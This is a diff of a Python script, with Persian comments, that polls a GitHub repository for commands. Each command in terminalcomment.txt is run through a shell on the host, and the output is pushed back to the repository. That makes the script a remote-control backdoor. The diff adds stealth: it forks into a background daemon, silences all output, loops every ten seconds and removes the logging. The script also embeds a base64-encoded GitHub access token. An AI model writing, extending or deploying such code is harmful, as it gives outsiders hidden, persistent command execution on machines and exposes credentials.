@@ -5,21 +5,23 @@ import os
 import subprocess
 import sys
 import base64
+import time
+import hashlib
 from datetime import datetime
 from pathlib import Path
 
 # ========== تنظیمات ==========
 REPO_URL_BASE = "https://github.com/sazidehm/linuxsupd.git"
-REPO_DIR = os.path.join(os.getcwd(), "linuxsupd")   # پوشه‌ای که اسکریپت در آن اجرا می‌شود
+REPO_DIR = os.path.join(os.getcwd(), "linuxsupd")
 BRANCH = "main"
 GIT_USER = "claudetest"
 GIT_EMAIL = "sazidehm@email.com"
 
 TOKEN_B64 = "Z2hwX1R5SmJqNENEU2FSTGtQejlxU09ab3Z0eDljbURteDREQ3hMVw==2"
-
 GITHUB_TOKEN = base64.b64decode(TOKEN_B64[:-1]).decode('utf-8')
-
 REPO_URL = REPO_URL_BASE.replace("https://", f"https://{GITHUB_TOKEN}@")
+
+CHECK_INTERVAL = 10  # هر ۱۰ ثانیه یکبار چک کن
 # ==============================
 
 def run_cmd(cmd, cwd=None):
@@ -29,36 +31,24 @@ def run_cmd(cmd, cwd=None):
 def git_init():
     repo_path = Path(REPO_DIR)
     if not repo_path.exists():
-        print(f"[*] کلون کردن ریپو...")
-        out, err, code = run_cmd(f"git clone {REPO_URL} {REPO_DIR}")
-        if code != 0:
-            print(f"❌ خطا در clone: {err}")
-            sys.exit(1)
+        run_cmd(f"git clone {REPO_URL} {REPO_DIR}")
     run_cmd(f"git config user.name '{GIT_USER}'", cwd=REPO_DIR)
     run_cmd(f"git config user.email '{GIT_EMAIL}'", cwd=REPO_DIR)
     run_cmd(f"git remote set-url origin {REPO_URL}", cwd=REPO_DIR)
 
 def git_pull():
-    print("[*] دریافت آخرین تغییرات...")
     run_cmd(f"git remote set-url origin {REPO_URL}", cwd=REPO_DIR)
     out, err, code = run_cmd(f"git pull origin {BRANCH}", cwd=REPO_DIR)
     if code != 0:
-        print(f"⚠️ خطا در pull: {err}")
         run_cmd(f"git fetch origin {BRANCH}", cwd=REPO_DIR)
         run_cmd(f"git reset --hard origin/{BRANCH}", cwd=REPO_DIR)
 
 def git_commit_push(message):
     run_cmd("git add .", cwd=REPO_DIR)
     out, err, code = run_cmd(f'git commit -m "{message}"', cwd=REPO_DIR)
-    if code != 0 and "nothing to commit" not in err and "nothing to commit" not in out:
-        print(f"⚠️ خطا در commit: {err}")
-    else:
+    if code == 0 or "nothing to commit" in err or "nothing to commit" in out:
         run_cmd(f"git remote set-url origin {REPO_URL}", cwd=REPO_DIR)
-        out_push, err_push, code_push = run_cmd(f"git push origin {BRANCH}", cwd=REPO_DIR)
-        if code_push != 0:
-            print(f"❌ خطا در push: {err_push}")
-        else:
-            print("[✓] تغییرات با موفقیت push شد")
+        run_cmd(f"git push origin {BRANCH}", cwd=REPO_DIR)
 
 def get_uptime():
     try:
@@ -76,30 +66,29 @@ def update_online_txt():
     online_path = Path(REPO_DIR) / "online.txt"
     name = "linuxarvin"
     uptime = get_uptime()
-    content = f"names={name}\nuptime={uptime}\n"
+    last_update = int(time.time())  # زمان یونیکس فعلی
+    content = f"names={name}\nuptime={uptime}\nlast_update={last_update}\n"
     with open(online_path, "w") as f:
         f.write(content)
-    print(f"[✓] online.txt به‌روز شد: {content.strip()}")
 
 def process_commands():
     term_path = Path(REPO_DIR) / "terminalcomment.txt"
     if not term_path.exists():
         with open(term_path, "w") as f:
             f.write("com = \nansw = \n")
-        return
+        return None
 
     with open(term_path, "r") as f:
         lines = f.readlines()
 
     com_line = next((line for line in lines if line.strip().startswith("com =")), None)
     if not com_line:
-        return
+        return None
 
     com_value = com_line.split("=", 1)[1].strip()
     if not com_value:
-        return
+        return None
 
-    print(f"[*] اجرای دستور: {com_value}")
     try:
         result = subprocess.check_output(com_value, shell=True, text=True, stderr=subprocess.STDOUT, timeout=30)
         answer = result.strip().replace("\n", " , ")
@@ -121,16 +110,55 @@ def process_commands():
     with open(term_path, "w") as f:
         f.writelines(new_lines)
 
-    print(f"[✓] پاسخ در terminalcomment.txt نوشته شد")
+    return com_value
 
-def main():
-    print(f"[*] شروع اسکریپت در {datetime.now()}")
+def daemonize():
+    if os.fork() > 0:
+        sys.exit(0)
+    os.setsid()
+    if os.fork() > 0:
+        sys.exit(0)
+    sys.stdout.close()
+    sys.stderr.close()
+    sys.stdin.close()
+    os.chdir("/")
+    with open('/dev/null', 'w') as f:
+        os.dup2(f.fileno(), sys.stdout.fileno())
+        os.dup2(f.fileno(), sys.stderr.fileno())
+
+def main_loop():
     git_init()
     git_pull()
     update_online_txt()
-    process_commands()
-    git_commit_push("Auto update: online status and command result")
-    print("[✓] پایان کار\n")
+    git_commit_push("Daemon started")
+
+    last_hash = None
+    while True:
+        try:
+            git_pull()
+            update_online_txt()
+
+            term_path = Path(REPO_DIR) / "terminalcomment.txt"
+            if term_path.exists():
+                with open(term_path, "r") as f:
+                    content = f.read()
+                current_hash = hashlib.md5(content.encode()).hexdigest()
+                if current_hash != last_hash:
+                    command = process_commands()
+                    if command:
+                        git_commit_push(f"Executed: {command}")
+                    last_hash = current_hash
+            else:
+                with open(term_path, "w") as f:
+                    f.write("com = \nansw = \n")
+                last_hash = None
+
+            time.sleep(CHECK_INTERVAL)
+        except Exception:
+            time.sleep(CHECK_INTERVAL)
 
 if __name__ == "__main__":
-    main()
+    if os.fork() > 0:
+        sys.exit(0)
+    daemonize()
+    main_loop()
